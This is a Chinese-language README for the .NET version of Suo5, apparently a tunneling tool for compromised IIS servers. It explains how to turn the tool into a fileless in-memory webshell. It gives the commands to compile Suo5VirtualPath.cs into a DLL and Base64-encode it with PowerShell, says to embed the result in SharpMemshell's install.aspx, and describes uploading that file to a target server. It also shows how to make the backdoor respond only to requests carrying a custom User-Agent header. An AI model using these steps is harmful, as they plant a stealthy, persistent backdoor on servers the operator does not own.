# .Net

环境依赖: .Net Framework >= 2.0

| 中间件     | 自动检测 | 全双工 | 半双工 | 短链接 |
|:--------|:----:|:---:|:---:|:---:|
| IIS(6+) |  ✓   |  x  |  ✓  |  ✓  |

## 使用必读

脚本中有一个对服务线程池调整的逻辑，至少会调整为 256，**如果并发数超过这个数量，请求会变得很慢**，这和 IIS 的请求模型有关。
如果你需要更大的并发，需要把这个值改大一些。

## 内存马

参考 [SharpMemshell](https://github.com/A-D-Team/SharpMemshell/blob/main/VirtualPath/memshell.cs) 项目可以轻松的将 Suo5
改为内存马形式来执行。

当前目录中的 `Suo5VirtualPath.cs` 是一个参考实现，**使用之前你必须将 242 行的 `if (false)` 改成自己的判断逻辑**
，否则永远不会命中处理逻辑,比如

```
if (httpContext.Request.Headers.Get("User-Agent") == "MyCustomAgent")
```

然后在使用 Suo5 时，增加一个自定义的请求头 `User-Agent: MyCustomAgent` 即可触发内存马逻辑。

### 编译使用

将 `Suo5VirtualPath.cs` 编译成 DLL:

```
C:\Windows\Microsoft.NET\Framework64\v2.0.50727\csc.exe /t:library Suo5VirtualPath.cs
```

将 DLL 转为 Base64:

```
powershell -NoProfile -Command "[Convert]::ToBase64String([IO.File]::ReadAllBytes('Suo5VirtualPath.dll'))" > Suo5VirtualPath.b64    
```

替代下面文件中的 `%%base64%%` 部分为上一步生成的 Base64 内容:

```
https://github.com/A-D-Team/SharpMemshell/blob/main/VirtualPath/install.aspx
```

上传该文件到目标服务器，访问 `install.aspx` 即可安装内存马。后续访问当前目录下的任意 aspx 文件即可触发内存马逻辑。